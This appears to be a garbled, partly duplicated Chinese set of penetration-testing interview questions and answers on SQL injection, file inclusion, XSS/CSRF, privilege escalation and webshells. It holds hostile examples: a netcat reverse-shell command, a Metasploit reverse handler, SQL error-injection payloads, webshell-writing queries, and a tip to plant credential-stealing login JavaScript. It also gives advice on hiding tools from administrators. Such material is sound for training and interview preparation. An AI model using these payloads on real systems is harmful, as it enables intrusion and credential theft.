8、如何判断 SQL 注⼊漏洞成因，如何防范？注⼊⽅式有哪些？除了数据库数据，利⽤⽅式还有哪些？select * from news where id = ‘$SQL’; 当程序执⾏访问新闻等⼀些操作都会执⾏到 sql 语句进⾏调⽤，如果在此调⽤过程中，提交了不合法的数据，⽽数据库 ⽆法识别则会报错。也就是⼀切输⼊都是有害的。 注⼊类型有 6 种，可以参考 SQLMAP，报错、盲注、联合、时间、内联、堆叠 注⼊提交⽅式：GET、POST、Cookies、⽂件头 利⽤⽅式：具体看什么数据库类型，像 SQLSERVER 可以命令执⾏，MYSQL 写 shell 有些权限⼤也可以执⾏命令但是 条件是在 lINUX 环境下。 防范: 边界, CDN -&gt; 脚本语⾔过滤 -&gt; 数据库过滤最⼩权限 -&gt; 主机 9、为什么有的时候没有错误回显没有进⾏错误打印或者错误屏蔽 10、宽字符注⼊的原理？如何利⽤宽字符注⼊漏洞，payload 如何构造？在 mysql 中使⽤了 gbk 编码，占⽤ 2 个字节, ⽽ mysql 的⼀种特性, GBK 是多字节编码，它认为两个字节就代表⼀个汉 字，所以 %df 时候会和转义符 \\ %5c 进⾏结合, 所以单引号就逃逸了出来, 当第⼀个字节的 ascii 码⼤于 128，就可以了。 11、CRLF 注⼊的原理CRLF 注⼊在 OWASP ⾥⾯被称为 HTTP 拆分攻击（HTTP Splitting）CRLF 是” 回⻋ + 换⾏”（\\r\\n）的简称, 在 HTTP 协议中，HTTP Header 与 HTTP Body 是⽤两个 CRLF 分隔的，浏览器就是根据这两个 CRLF 来取出 HTTP 内容并显 示出来。所以，⼀旦我们能够控制 HTTP 消息头中的字符，注⼊⼀些恶意的换⾏ 12、mysql 的⽹站注⼊，5.0 以上和 5.0 以下有什么区别？5.0 以下没有 information_schema 这个系统表，⽆法列表名等，只能暴⼒跑表名。 5.0 以下是多⽤户单操作，5.0 以上是多⽤户多操作。 13、php.ini 可以设置哪些安全特性禁⽤ PHP 函数 允许 include 或打开访问远程资源 14、php 的 %00 截断的原理是什么？因为在 C 语⾔中字符串的结束标识符 %00 是结束符号，⽽ PHP 就是 C 写的，所以继承了 C 的特性，所以判断为 %00 是结束符号不会继续往后执⾏ 条件：PHP&lt;5.3.29，且 GPC 关闭 15、webshell 检测，有哪些⽅法grep、关键词、关键函数 安全狗、D 盾 的 本地包含 洞 什么 段带有 洞的代 ⼿ 的话如何发掘 如 报错 你 怎么16、php 的 LFI，本地包含漏洞原理是什么？写⼀段带有漏洞的代码。⼿⼯的话如何发掘？如果⽆报错回显，你是怎么 遍历⽂件的？ 12345if ($_GET['fifile']){ include $_GET['fifile']; } 包含的⽂件设置为变量，并且⽆过滤导致可以调⽤恶意⽂件 还可以对远程⽂件包含，但需要开启 allow_url_include = ON 通过测试参数的地⽅进⾏本地⽂件 / etc/passwd 等包含 如何存在漏洞⽽且没有回显，有可能没有显示在⻚⾯⽽是 在⽹⻚源代码中，除了些可以利⽤ DNSlog 进⾏获取包含的信息。从 index.php ⽂件⼀级级往读取 也可以利⽤ PHP 封 装协议读取⽂件 17、说说常⻅的中间件解析漏洞利⽤⽅式IIS 6.0 /xx.asp/xx.jpg “xx.asp” 是⽂件夹名 IIS 7.0/7.5 默认 Fast-CGI 开启，直接在 url 中图⽚地址后⾯输⼊ / 1.php，会把正常图⽚当成 php 解析 Nginx 版本⼩于等于 0.8.37，利⽤⽅法和 IIS 7.0/7.5 ⼀样，Fast-CGI 关闭情况下也可利⽤。 空字节代码 xxx.jpg%00.php Apache 上传的⽂件命名为：test.php.x1.x2.x3，Apache 是从右往左判断后缀 的 户名密 存放在 张表 密 采 种加密⽅式18、mysql 的⽤户名密码是存放在那张表⾥⾯？mysql 密码采⽤哪种加密⽅式？ mysql -&gt; users SHA1 19、Windows、Linux、数据库的加固降权思路，任选其⼀禁⽤ root 禁⽌远程访问 禁⽌写⼊ 单独帐号 禁⽌执⾏ system 等函数 20、你使⽤什么⼯具来判断系统是否存在后⻔Chkrootkit Rkhunter 21、如何绕过 CDN 获取⽬标⽹站真实 IP，谈谈你的思路？类似 phpinfo、⽹站信息 C 段、⼦域名 历史解析记录 DDOSzmap 全⽹扫描识别 http 头 ⽹站域名管理员邮箱，注册过的域名等相关信息关联 22、如果给你⼀个⽹站, 你的渗透测试思路是什么? 在获取书⾯授权的前提下。其实这是⼀个⾮常⼤的话题，渗透⼤部分思路都是如此，⽽⾯试官是想听到你回答不⼀样的答案让⼈眼前⼀亮 如何才做 到让⼈眼前⼀亮都需要看你的经验，把你实践的过程拿出来说，以及遇到什么问题如何解决，最终取得成果 渗透其它⼤ 同⼩异, ⽽做为渗透者知识的储备、基础扎实、耐⼼、细⼼都是必不可少。 23、谈⼀谈 Windows 系统与 Linux 系统提权的思路？Windows Windows 服务⽐较多所以⽅法也如此，最基本的就是 Exp 提权，数据库 SQLServer、MYSQL UDF 等、第三⽅软件提 权。 除此之外提权的成功与否和在于信息收集也⾮常重要，你对这台服务器和管理员了解多少。 windows 权限提升 (⼆) Linux Linux 也是类似，除了 EXP 或者⾼版本的内核⽆法提权之外，通过第三⽅软件和服务，除了提权也可以考虑把这台机器 当跳版, 达到先进⼊内⽹安全防线最弱的地⽅寻找有⽤的信息，再迂回战术。 linux 权限提升 Brief 枚举脚本以 root 权限运⾏的程序 ⽤户安装的软件 弱⼝令或者明⽂密码 只能内部访问的服务 suid 和 guid 错误配置 滥⽤ sudo 权限 以 root 权限运⾏的脚本⽂件 错误的路径配置 计划任务 未挂载的⽂件系统 NFS 共享 通过键盘记录仪窃取密码 其它有⽤的和提权相关的东⻄ 内核提权 24、列举出您所知道的所有开源组件⾼危漏洞 (⼗个以上)Tomcat NginxApache Hadhoop Docker Jenkins Zenoss Jboss MongoDB Redis GlassFish 25、反弹 shell 的常⽤命令？⼀般常反弹哪⼀种 shell？为什么？nc -lvvp 7777 -e /bin/bash bash 是交互式, 否则像 useradd ⽆法执⾏交互 26、CMD 命令⾏如何查询远程终端开放端⼝tasklist /svc netstat -ano 27、服务器为 IIS+PHP+MySQL，发现 root 权限注⼊漏洞，讲讲你的渗透思路可以读取 IIS 信息，知道路径, 如果像 WAMMP 类似构建，通过 @@datadir 知道数据库路径也可以猜测⽹站路径。或者直接写 Shell 28、请写出 Mysql5 数据库中查询库表所有列名的语句select COLUMN_NAME from information_schema.COLUMNS where table_name = ‘your_table_name’ and table_schema = ‘your_db_name’; 29、下⾯这段代码存在漏洞吗？如果存在请说出存在什么漏洞并利⽤http://www.exp.com/1.php 123456789&lt;?php $s_func = $_GET['s_func']; $info = $_GET['info']; $s_func($info); ?&gt; 代码执⾏, 通过 assert 调⽤ 30、udf 提权MySQL 可以⾃定义函数, 通过⾃定义函数做到类似 xp_cmdshell 效果 31、SQL 头注⼊点UserAgent Referer CookieCookie X-FOR-I 32、php 中命令执⾏涉及到的函数eval() assert() system() exec() shell_exec() 33、SSRF 漏洞的成因 防御 绕过模拟服务器对其它资源进⾏请求 IP 探测，如果想漏洞利⽤必需要构造好 Payload 禁⽌跳转，限制协议，内外⽹限制， URL 限制 针对 IP 格式 34、mysql 写 shell 有⼏种⽅法outfifile、dumpfifile、开启 log 写 webshell 35、Metasploit 打开反向监听的命令use exploit/multi/handler set payload windows/meterpreter/reverse_tcp 36、应急响应的步骤 准备已经编译好的⼯具以及取证分析等⼯具⼲净可靠放 U 盘 初步判断事件的类型 是被⼊侵 ddos 还是其它的原因2. 初步判断事件的类型，是被⼊侵、ddos 还是其它的原因 ⾸先抑制范围、影响范围，隔离使受害⾯不继续扩⼤。 寻找原因，封堵攻击源。 把业务恢复⾄正常⽔平 监控有⽆异常，报告、管理环节的⾃省和改进措施。 37、有哪些反向代理的⼯具?reGeirg、EW、lcx、Ngrok、frp 38、有什么⽐较曲折的渗透经历这个问题想知道你⼯作渗透到什么样的程度，只是简单的漏扫搬砖，还是有毅⼒坚持完成整个渗透，如：对⽬标不放 弃，坚持⼀个⽉最终通过各种⼿段，曲折的过程拿下⽬标。 39、怎么查找域控⽅法有很多 1.通过 DNS 查询 dig -t SRV _gc._tcp.lab.ropnop.com dig -t SRV _ldap._tcp.lab.ropnop.com dig -t SRV _kerberos._tcp.lab.ropnop.com dig -t SRV _kpasswd._tcp.lab.ropnop.com 2.端⼝扫描 域服务器都会开启 389 端⼝，所以可以通过扫描端⼝进⾏识别。 3.其实很多域环境⾥，DNS 服务器就是域控制根本不需要怎么找。 4.各种命令 dsquery net group “Domain controllers” nltest /DCLIST:pentest.com …… 前端篇1、什么是同源策略?源就是主机、协议、端⼝名的⼀个三元组 同源策略 (Same Origin Policy, SOP) 是 Web 应⽤程序的⼀种安全模型，被⼴ 泛地应⽤在处理 WEB 内容的各种客户端上，⽐如各⼤浏览器，微软的 Silverlight，Adobe 的 Flash/Acrobat 等等。 2、XSS 能⽤来做什么？⽹络钓⻥、窃取⽤户 Cookies、弹⼴告刷流量、具备改⻚⾯信息、删除⽂章、获取客户端信息、传播蠕⾍ 3、XSS 的三种类型，防御⽅法反射型、Dom Base XSS、存储型 防御⽅法这个只能说个⼤概，毕竟这是⼀个⽐较⼤的话题，⽽且防御的⽅法还得看所 在的业务等。从⽹络层、主机层、Web 层、数据库，通过 CDN 都有过滤常⻅⼀些攻击⼿法，但不能有 CDN 就以为可 以了，添加 CDN 只是让攻击成本增⾼，开启 HttpOnly，以防确实存在避免 cookies 被获取，CSP 策略、再就是语⾔中 提供的函数对输⼊过滤，以及输出编码以及 ModSecurity 类的防⽕墙。 4、存储型 xss 原理?如⽹站留⾔版，把插⼊的记录存储在数据库中，插⼊的代码会⼀直留在⻚⾯上，当其它⽤户访问会从数据库中读取并触 发漏洞。 5、你怎么理解 xss 攻击？是⼀种被动型，在不知道的情况下触发类似⽆感型，在渗透很多情况下平常的渗透⼿段以及取得⽬标的信息，⽽ XSS 就 能轻松获取，类似 QQ 邮箱你不可能渗透这么⼤的互联⽹就算可以时间成本都⾮常的⾼，XSS ⽐较有针对性。 6、如何快速发现 xss 位置？各种输⼊的点，名称、上传、留⾔、可交互的地⽅，⼀切输⼊都是在害原则。 7、Dom xss 原理 / 防范DOM 型 XSS 并不需要服务器解析响应的直接参与触发 XSS 靠的是浏览器 DOM 解析 DOM—based XSS 漏洞是基于⽂ 档对象模型 Document Objeet Model,DOM) 的⼀种漏洞。 cument.getElementById(“a”).innerHTML=”yyyyyy”; 在输⼊点过滤敏感关键字 8、DOM 型 XSS 与反射型 XSS 区别？DOM 型就是 JavaScript 中的 Document 对象 HTML 注⼊，直接浏览器处理。 9、如何使得前端 referer 为空通过地址栏输⼊、从书签⾥⾯选择或者浏览器的插件 BurpSuite 修改。 10、cookie 参数，security ⼲什么的Httponly：防⽌ cookie 被 xss 偷https：防⽌ cookie 在⽹络中被偷 Secure：阻⽌ cookie 在⾮ https 下传输，很多全站 https 时会漏掉 Path : 区分 cookie 的标识，安全上作⽤不⼤，和浏览器同源冲突 11、如果 SRC 上报了⼀个 XSS 漏洞，payload 已经写⼊⻚⾯，但未给出具体位置，如何快速介⼊？看是否什么类型的 XSS，XSS 反射型看提交的地址，指的参数是哪个位置，通过这个⻚⾯进⾏ fuzzing 测试。如果是存 储型⻚⾯查找关键字。 12、XSS， CSRF， CRLF ⽐较容易弄混，说说三者的原理，防御⽅法CSRF 跨站请求伪造，构造已知的所有参数让对⽅访问, 防护 CSRF: 防御原理：不让你那么容易伪造请求 (cookie 中加⼊随机数，要求请求中带上，⽽攻击者获取不到 cookie 中的随机数, 验证 HTTP Referer 字段, 在请求地址中添加 takon 验证 CRLF 原理: HTTP 拆分攻击（HTTP Splitting），CRLF 是” 回⻋ + 换⾏”（\\r\\n）的简称。 在 HTTP 协议中，HTTP Header 与 HTTP Body 是⽤两个 CRLF 分隔的，浏览器就是根据这两个 CRLF 来取出 HTTP 内容并显示出来。所以，⼀旦我们能够控制 HTTP 消息头中的字符，注⼊⼀些恶意的换⾏，这样我们就能注⼊⼀些会话 Cookie 或者 HTML 代码，所以 CRLF Injection ⼜叫 HTTP Response Splitting，简称 HRS。 13、csrf 如何不带 referer 访问通过地址栏，⼿动输⼊；从书签⾥⾯选择；通过实现设定好的⼿势。上⾯说的这三种都是⽤户⾃⼰去操作，因此不算 CSRF。 跨协议间提交请求。常⻅的协议：ftp://,http://,https://,fifile://,javascript:,data:. 最简单的情况就是我们在本地打开⼀个 HTML ⻚⾯ 这个时候浏览器地址栏是 fifile:// 开头的 如果这个 HTML ⻚⾯向任何 http 站点提交请求的话 这些请求HTML ⻚⾯，这个时候浏览器地址栏是 fifile:// 开头的，如果这个 HTML ⻚⾯向任何 http 站点提交请求的话，这些请求 的 Referer 都是空的。那么我们接下来可以利⽤ data: 协议来构造⼀个⾃动提交的 CSRF 攻击。当然这个协议是 IE 不⽀ 持的，我们可以换⽤ javascript: 14、CSRF 成因及防御措施；如果不⽤ token 如何做防御？X-Frame-Options DENY(禁⽌被 加载进任何 frame) SAMEORIGIN(仅允许被加载进同域内的 frame) X-XSS-Protection 0（表示禁⽌⽤这个策略） 1（默认，对危险脚本做⼀些标志或修改，以阻⽌在浏览器上熏染执⾏。） 1;mode=block（强制不熏染，在 Chrome 下直接跳转到空⽩⻚，在 IE 下返回⼀个 #符号） 这个策略仅针对反射型，对付不了存储型 XSS，能识别出反射型是因为提交请求的 URL 中带有可疑的 XSS 代码⽚段。 X-Content-Security-Policy 15、Xss worm 原理攻击者发现⽬标⽹站存在 XSS 漏洞，并且可以编写 XSS 蠕⾍。利⽤⼀个宿主（如博客空间）作为传播源头进⾏ XSS 攻 击。 16、Cookie 的 P3P 性质HTTP 响应头的 p3 字段是 W3C 公布的⼀项隐私保护推荐标准，该字段⽤于标识是否允许⽬标⽹站的 cookie 被另⼀个 域通过加载⽬标⽹站⽽设置或发送，仅 IE 执⾏了该策略。17、CSRF 有何危害？ 篡改⽬标⽹站上的⽤户数据 盗取⽤户隐私数据 传播 CSRF 蠕 ⼀、思路流程1、信息收集a、服务器的相关信息（真实 ip，系统类型，版本，开放端⼝，WAF 等） b、⽹站指纹识别（包括，cms，cdn，证书等），dns 记录 c、whois 信息，姓名，备案，邮箱，电话反查（邮箱丢社⼯库，社⼯准备等） e、⼦域名收集，旁站，C 段等 f、google hacking 针对化搜索，pdf ⽂件，中间件版本，弱⼝令扫描等 g、扫描⽹站⽬录结构，爆后台，⽹站 banner，测试⽂件，备份等敏感⽂件泄漏等 h、传输协议，通⽤漏洞，exp，github 源码等 2、漏洞挖掘a、浏览⽹站，看看⽹站规模，功能，特点等 b、端⼝，弱⼝令，⽬录等扫描, 对响应的端⼝进⾏漏洞探测，⽐如 rsync, ⼼脏出⾎，mysql,ftp,ssh 弱⼝令等。 c、XSS，SQL 注⼊，上传，命令注⼊，CSRF，cookie 安全检测，敏感信息，通信数据传输，暴⼒破解，任意⽂件上 传，越权访问，未授权访问，⽬录遍历，⽂件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使⽤漏扫⼯具等 3、漏洞利⽤ &amp; 权限提升a mysql 提权 serv u 提权 oracle 提权a、mysql 提权，serv-u 提权，oracle 提权 b、windows 溢出提权 c、linux 脏⽜, 内核漏洞提权 e 4、清除测试数据 &amp; 输出报告⽇志、测试数据的清理 总结，输出渗透测试报告，附修复⽅案 5、复测验证并发现是否有新漏洞，输出报告，归档 ⼆、问题1、拿到⼀个待检测的站，你觉得应该先做什么？信息收集a、获取域名的 whois 信息, 获取注册者邮箱姓名电话等，丢社⼯库⾥看看有没有泄露密码，然后尝试⽤泄露的密码进⾏ 登录后台。⽤邮箱做关键词进⾏丢进搜索引擎。利⽤搜索到的关联信息找出其他邮箱进⽽得到常⽤社交账号。社⼯找出 社交账号，⾥⾯或许会找出管理员设置密码的习惯 。利⽤已有信息⽣成专⽤字典。 b、查询服务器旁站以及⼦域名站点，因为主站⼀般⽐较难，所以先看看旁站有没有通⽤性的 cms 或者其他漏洞。 c、查看服务器操作系统版本，web 中间件，看看是否存在已知的漏洞，⽐如 IIS，APACHE,NGINX 的解析漏洞 d、查看 IP，进⾏ IP 地址端⼝扫描，对响应的端⼝进⾏漏洞探测，⽐如 rsync, ⼼脏出⾎，mysql,ftp,ssh 弱⼝令等。 e、扫描⽹站⽬录结构，看看是否可以遍历⽬录，或者敏感⽂件泄漏，⽐如 php 探针 f、google hack 进⼀步探测⽹站的信息，后台，敏感⽂件 漏洞扫描开始检测漏洞 如 XSS XSRF sql 注⼊ 代码执⾏ 命令执⾏ 越权访问 ⽬录读取 任意⽂件读取 下载 ⽂件包含开始检测漏洞，如 XSS,XSRF,sql 注⼊，代码执⾏，命令执⾏，越权访问，⽬录读取，任意⽂件读取，下载，⽂件包含， 远程命令执⾏，弱⼝令，上传，编辑器漏洞，暴⼒破解等 漏洞利⽤利⽤以上的⽅式拿到 webshell，或者其他权限 权限提升提权服务器，⽐如 windows 下 mysql 的 udf 提权，serv-u 提权，windows 低版本的漏洞，如 iis6,pr, 巴⻄烤⾁，linux 脏⽜漏洞，linux 内核版本漏洞提权，linux 下的 mysql system 提权以及 oracle 低权限提权 ⽇志清理总结报告及修复⽅案2、判断出⽹站的 CMS 对渗透有什么意义？查找⽹上已曝光的程序漏洞。 如果开源，还能下载相对应的源码进⾏代码审计。 3. ⼀个成熟并且相对安全的 CMS，渗透时扫⽬录的意义？敏感⽂件、⼆级⽬录扫描 站⻓的误操作⽐如：⽹站备份的压缩⽂件、说明. txt、⼆级⽬录可能存放着其他站点 4.常⻅的⽹站服务器容器。IIS、Apache、nginx、Lighttpd、Tomcat 5.mysql 注⼊点，⽤⼯具对⽬标站直接写⼊⼀句话，需要哪些条件？以 站的绝对路root 权限以及⽹站的绝对路径。 6.⽬前已知哪些版本的容器有解析漏洞，具体举例。a、IIS 6.0 /xx.asp/xx.jpg “xx.asp” 是⽂件夹名 b、IIS 7.0/7.5 默认 Fast-CGI 开启，直接在 url 中图⽚地址后⾯输⼊ / 1.php，会把正常图⽚当成 php 解析 c、Nginx 版本⼩于等于 0.8.37，利⽤⽅法和 IIS 7.0/7.5 ⼀样，Fast-CGI 关闭情况下也可利⽤。空字节代码 xxx.jpg.php d、Apache 上传的⽂件命名为：test.php.x1.x2.x3，Apache 是从右往左判断后缀 e、lighttpd xx.jpg/xx.php，不全, 请⼩伙伴们在评论处不吝补充，谢谢！ 如何⼿⼯快速判断⽬标站是 windows 还是 linux 服务器？ linux ⼤⼩写敏感, windows ⼤⼩写不敏感。 8. 为何⼀个 mysql 数据库的站，只有⼀个 80 端⼝开放？更改了端⼝，没有扫描出来。 站库分离。 3306 端⼝不对外开放 9、3389 ⽆法连接的⼏种情况没开放 3389 端⼝ 端⼝被修改防护拦截 处于内⽹ (需进⾏端⼝转发) 10. 如何突破注⼊时字符被转义？宽字符注⼊ hex 编码绕过 11. 在某后台新闻编辑界⾯看到编辑器，应该先做什么？查看编辑器的名称版本, 然后搜索公开的漏洞。 12. 拿到⼀个 webshell 发现⽹站根⽬录下有. htaccess ⽂件，我们能做什么？能做的事情很多，⽤隐藏⽹⻢来举例⼦： 插⼊ &lt;FilesMatch “xxx.jpg”&gt; SetHandler application/x-httpd-php .jpg ⽂件会被解析成. php ⽂件。 具体其他的事情，不好详说，建议⼤家⾃⼰去搜索语句来玩玩。 13. 注⼊漏洞只能查账号密码？只要权限⼴，拖库脱到⽼。 14. 安全狗会追踪变量，从⽽发现出是⼀句话⽊⻢吗？是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是⼀成不变的。 15.access 扫出后缀为 asp 的数据库⽂件，访问乱码， 如何实现到本地利⽤？迅雷下载，直接改后缀为. mdb。 16. 提权时选择可读写⽬录，为何尽量不⽤带空格的⽬录？因为 exp 执⾏多半需要空格界定参数17. 某服务器有站点 A,B 为何在 A 的后台添加 test ⽤户，访问 B 的后台。发现也添加上了 test ⽤户？同数据库。 18. 注⼊时可以不使⽤ and 或 or 或 xor，直接 order by 开始注⼊吗？and/or/xor，前⾯的 1=1、1=2 步骤只是为了判断是否为注⼊点，如果已经确定是注⼊点那就可以省那步骤去。 19: 某个防注⼊系统，在注⼊时会提示：系统检测到你有⾮法注⼊的⾏为。 已记录您的 ip xx.xx.xx.xx 时间: 2016:01-23 提交⻚⾯: test.asp?id=15 提交内容: and 1=1 20、如何利⽤这个防注⼊系统拿 shell？在 URL ⾥⾯直接提交⼀句话，这样⽹站就把你的⼀句话也记录进数据库⽂件了 这个时候可以尝试寻找⽹站的配置⽂件 直接上菜⼑链接。 21. 上传⼤⻢后访问乱码时，有哪些解决办法？浏览器中改编码。 22. 审查上传点的元素有什么意义？有些站点的上传⽂件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。 23. ⽬标站禁⽌注册⽤户，找回密码处随便输⼊⽤户名提示：“ 此⽤户不存在 ” ，你觉得这⾥怎样利⽤？先爆破⽤户名，再利⽤被爆破出来的⽤户名爆破密码。 其实有些站点，在登陆处也会这样提示 所有和数据库有交互的地⽅都有可能有注⼊。 24. ⽬标站发现某 txt 的下载地址为http://www.test.com/down/down.php?fifile=/upwdown/1.txt，你有什么思路？ 这就是传说中的下载漏洞！在 fifile = 后⾯尝试输⼊ index.php 下载他的⾸⻚⽂件，然后在⾸⻚⽂件⾥继续查找其他⽹站 的配置⽂件，可以找出⽹站的数据库密码和数据库的地址。 25. 甲给你⼀个⽬标站，并且告诉你根⽬录下存在 / abc / ⽬录，并且此⽬录下存在编辑器和 admin ⽬录。请问你的想法是？ 直接在⽹站⼆级⽬录 / abc / 下扫描敏感⽂件及⽬录。 26. 在有 shell 的情况下，如何使⽤ xss 实现对⽬标站的⻓久控制？后台登录处加⼀段记录登录账号密码的 js，并且判断是否登录成功，如果登录成功，就把账号密码记录到⼀个⽣僻的路 径的⽂件中或者直接发到⾃⼰的⽹站⽂件中。(此⽅法适合有价值并且需要深⼊控制权限的⽹络)。 在登录后才可以访问的⽂件中插⼊ XSS 脚本。 27. 后台修改管理员密码处，原密码显示为 *。你觉得该怎样实现读出这个⽤户的密码？审查元素 把密码处的 password 属性改成 text 就明⽂显示了 28. ⽬标站⽆防护，上传图⽚可以正常访问，上传脚本格式访问则 403. 什么原因？原因很多，有可能 web 服务器配置把上传⽬录写死了不执⾏相应脚本，尝试改后缀名绕过 29. 审查元素得知⽹站所使⽤的防护软件，你觉得怎样做到的？在敏感操作被拦截，通过界⾯信息⽆法具体判断是什么防护的时候，F12 看 HTML 体部 ⽐如护卫神就可以在名称那看到内容。 30. 在 win2003 服务器中建⽴⼀个 .zhongzi ⽂件夹⽤意何为？隐藏⽂件夹，为了不让管理员发现你传上去的⼯具。 31、sql 注⼊有以下两个测试选项，选⼀个并且阐述不选另⼀个的理由：A. demo.jsp?id=2+1 B. demo.jsp?id=2-1 选 B，在 URL 编码中 + 代表空格，可能会造成混淆 32、以下链接存在 sql 注⼊漏洞，对于这个变形注⼊，你有什么思路？demo.do?DATA=AjAxNg== DATA 有可能经过了 base64 编码再传⼊服务器，所以我们也要对参数进⾏ base64 编码才能正确完成测试 33、发现 demo.jsp?uid=110 注⼊点，你有哪⼏种思路获取 webshell，哪种是优选？有写⼊权限的，构造联合查询语句使⽤ using INTO OUTFILE，可以将查询的输出重定向到系统的⽂件中，这样去写⼊ WebShell 使⽤ sqlmap –os-shell 原理和上⾯⼀种相同，来直接获得⼀个 Shell，这样效率更⾼ 通过构造联合查询语句 得到⽹站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等⽅法上传 Shell 34、CSRF 和 XSS 和 XXE 有什么区别，以及修复⽅式？XSS 是跨站脚本攻击，⽤户提交的数据中可以构造代码来执⾏，从⽽实现窃取⽤户信息等攻击。修复⽅式：对字符实体 进⾏转义、使⽤ HTTP Only 来禁⽌ JavaScript 读取 Cookie 值、输⼊时校验、浏览器与 Web 应⽤端采⽤相同的字符编 码。 CSRF 是跨站请求伪造攻击，XSS 是实现 CSRF 的诸多⼿段中的⼀种，是由于没有在关键操作执⾏时进⾏是否由⽤户⾃ 愿发起的确认。修复⽅式：筛选出需要防范 CSRF 的⻚⾯然后嵌⼊ Token、再次输⼊密码、检验 Referer XXE 是 XML 外部实体注⼊攻击，XML 中可以通过调⽤实体来请求本地或者远程内容，和远程⽂件保护类似，会引发相关安全问题，例如敏感⽂件读取。修复⽅式：XML 解析库在调⽤时严格禁⽌对外部实体的解析。 35、CSRF、SSRF 和重放攻击有什么区别？CSRF 是跨站请求伪造攻击，由客户端发起 SSRF 是服务器端请求伪造，由服务器发起 重放攻击是将截获的数据包进⾏ 重放，达到身份认证等⽬的 36、说出⾄少三种业务逻辑漏洞，以及修复⽅式？密码找回漏洞中存在 1）密码允许暴⼒破解、 2）存在通⽤型找回凭证、 3）可以跳过验证步骤、 4）找回凭证可以拦包获取 等⽅式来通过⼚商提供的密码找回功能来得到密码。身份认证漏洞中最常⻅的是 1）会话固定攻击 2） Cookie 仿冒 只要得到 Session 或 Cookie 即可伪造⽤户身份。验证码漏洞中存在 1）验证码允许暴⼒破解 2）验证码可以通过 Javascript 或者改包的⽅法来进⾏绕过 37、圈出下⾯会话中可能存在问题的项，并标注可能会存在的问题？get /ecskins/demo jsp?uid=2016031900&amp;keyword=”hello world”get /ecskins/demo.jsp?uid=2016031900&amp;keyword= hello world HTTP/1.1Host:***.com:82User-Agent:Mozilla/ 5.0 Firefox/40Accept:text/css,/;q=0.1 Accept-Language:zh-CN;zh;q=0.8;en-US;q=0.5,en;q=0.3 Referer:http://***.com/eciop/orderForCC/ cgtListForCC.htm?zone=11370601&amp;v=145902 Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d; uniqueserid=session_OGRMIFIYJHAH5_HZRQOZAMHJ; st_uid=N90PLYHLZGJXI-NX01VPUF46W; status=True Connection:keep-alive 有写⼊权限的，构造联合查询语句使⽤ using INTO OUTFILE，可以将查询的输出重定向到系统的⽂件中，这样去写⼊ WebShell 使⽤ sqlmap –os-shell 原理和上⾯⼀种相同，来直接获得⼀个 Shell，这样效率更⾼ 通过构造联合查询语句 得到⽹站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等⽅法上传 Shell 38、给你⼀个⽹站你是如何来渗透测试的? 在获取书⾯授权的前提下。39、sqlmap，怎么对⼀个注⼊点注⼊？1）如果是 get 型号，直接，sqlmap -u “诸如点⽹址”. 2) 如果是 post 型诸如点，可以 sqlmap -u “注⼊点⽹址” –data=”post 的参数 “ 3）如果是 cookie，X-Forwarded-For 等，可以访问的时候，⽤ burpsuite 抓包，注⼊处⽤号替换，放到⽂件⾥，然后 sqlmap -r “⽂件地址” 40、nmap，扫描的⼏种⽅式41、sql 注⼊的⼏种类型？1）报错注⼊ 2）bool 型注⼊ 3）延时注⼊ 4）宽字节注⼊ 42、报错注⼊的函数有哪些？10 个1）and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】 2）通过floor报错 向下取整3）+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1) 4）.geometrycollection()select from test where id=1 and geometrycollection((select from(selectfrom(select user())a) b)); 5）.multipoint()select from test where id=1 and multipoint((select from(select from(select user())a)b)); 6）.polygon()select from test where id=1 and polygon((select from(select from(select user())a)b)); 7）.multipolygon()select from test where id=1 and multipolygon((select from(select from(select user())a)b)); 8）.linestring()select from test where id=1 and linestring((select from(select from(select user())a)b)); 9）.multilinestring()select from test where id=1 and multilinestring((select from(select from(select user())a)b)); 10）.exp()select from test where id=1 and exp(~(select * from(select user())a)); 43、延时注⼊如何来判断？if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1) 44、盲注和延时注⼊的共同点？都是⼀个字符⼀个字符的判断 45、如何拿⼀个⽹站的 webshell？上传，后台编辑模板，sql 注⼊写⽂件，命令执⾏，代码执⾏， ⼀些已经爆出的 cms漏洞，⽐如 dedecms 后台可以直接建⽴脚本⽂件，wordpress 上传插件包含脚本⽂件 zip 压缩包等 46、sql 注⼊写⽂件都有哪些函数？select ‘⼀句话’ into outfile ‘路径’ select ‘⼀句话’ into dumpfile ‘路径’ select ‘‘ into dumpfile ‘d:\\wwwroot\\baidu.com\\nvhack.php’; 47、如何防⽌ CSRF?1）验证 referer 2）验证 token 详细：http://cnodejs.org/topic/5533dd6e9138f09b629674fd 48、owasp 漏洞都有哪些？1）SQL 注⼊防护⽅法： 2）失效的身份认证和会话管理2）失效的身份认证和会话管理 3）跨站脚本攻击 XSS 4）直接引⽤不安全的对象 5）安全配置错误 6）敏感信息泄露 7）缺少功能级的访问控制 8）跨站请求伪造 CSRF 9）使⽤含有已知漏洞的组件 10）未验证的重定向和转发 49、SQL 注⼊防护⽅法？1）使⽤安全的 API 2）对输⼊的特殊字符进⾏ Escape 转义处理 3）使⽤⽩名单来规范化输⼊验证⽅法 4）对客户端输⼊进⾏控制，不允许输⼊ SQL 注⼊相关的特殊字符 5）服务器端在提交数据库进⾏ SQL 查询之前，对特殊字符进⾏过滤、转义、替换、删除。 50、代码执⾏，⽂件读取，命令执⾏的函数都有哪些？1）代码执⾏： eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function 2）⽂件读取： file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等 3)命令执⾏： system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open() 51、img 标签除了 onerror 属性外，还有其他获取管理员路径的办法吗？src 指定⼀个远程的脚本⽂件，获取 referer52、img 标签除了 onerror 属性外，并且 src 属性的后缀名，必须以. jpg 结尾，怎么获取管理员路径。 1）远程服务器修改 apache 配置⽂件，配置. jpg ⽂件以 php ⽅式来解析 AddType application/x-httpd-php .jpg &lt;img src=http://xss.tv/1.jpg&gt; 会以 php ⽅式来解析 53、为什么 aspx ⽊⻢权限⽐ asp ⼤？aspx 使⽤的是. net 技术。IIS 